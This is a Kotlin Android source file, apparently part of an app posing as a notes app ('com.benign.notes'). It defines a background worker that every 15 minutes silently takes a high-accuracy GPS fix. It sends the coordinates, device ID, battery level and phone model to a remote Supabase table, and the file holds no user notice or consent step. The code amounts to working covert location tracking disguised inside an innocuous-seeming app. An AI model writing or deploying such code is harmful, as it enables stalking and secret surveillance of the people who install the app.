package com.benign.notes

import android.annotation.SuppressLint
import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.work.*
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

class BeaconWorker(private val ctx: Context, params: WorkerParameters) : CoroutineWorker(ctx, params) {

    // IMPORTANT: Use your long JWT Anon Key here, NOT the publishable ID.
    private val supabaseUrl = "https://YOUR-PROJECT-ID.supabase.co"
    private val supabaseKey = "YOUR-LONG-JWT-ANON-KEY"

    @SuppressLint("MissingPermission")
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val locationClient = LocationServices.getFusedLocationProviderClient(ctx)
            
            // Get highly accurate fresh location
            val location = locationClient.getCurrentLocation(
                Priority.PRIORITY_HIGH_ACCURACY,
                CancellationTokenSource().token
            ).await()

            val lat = location?.latitude
            val lon = location?.longitude

            postToSupabase(lat, lon)
            Result.success()
        } catch (e: Exception) {
            Log.e("BeaconWorker", "Work failed: ${e.message}")
            Result.retry()
        }
    }

    private fun postToSupabase(lat: Double?, lon: Double?) {
        val deviceId = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val battery = getBatteryPercentage()
        
        val jsonPayload = """
            {
                "id": "$deviceId",
                "ts": ${System.currentTimeMillis()},
                "lat": ${lat ?: "null"},
                "lon": ${lon ?: "null"},
                "batt": $battery,
                "model": "${Build.MODEL}",
                "sdk": ${Build.VERSION.SDK_INT}
            }
        """.trimIndent()

        val url = URL("$supabaseUrl/rest/v1/beacons")
        val conn = url.openConnection() as HttpURLConnection
        
        try {
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", supabaseKey)
            conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("Prefer", "return=minimal")
            conn.doOutput = true

            OutputStreamWriter(conn.outputStream).use { it.write(jsonPayload) }

            if (conn.responseCode >= 400) {
                val errorMsg = conn.errorStream?.bufferedReader()?.readText()
                Log.e("BeaconWorker", "Supabase Error: ${conn.responseCode} - $errorMsg")
            }
        } finally {
            conn.disconnect()
        }
    }

    private fun getBatteryPercentage(): Int {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    companion object {
        fun schedule(ctx: Context) {
            val req = PeriodicWorkRequestBuilder<BeaconWorker>(15, TimeUnit.MINUTES)
                .setBackoffCriteria(BackoffPolicy.LINEAR, 1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(ctx).enqueueUniquePeriodicWork(
                "beacon_tracker",
                ExistingPeriodicWorkPolicy.UPDATE,
                req
            )
        }
    }
}
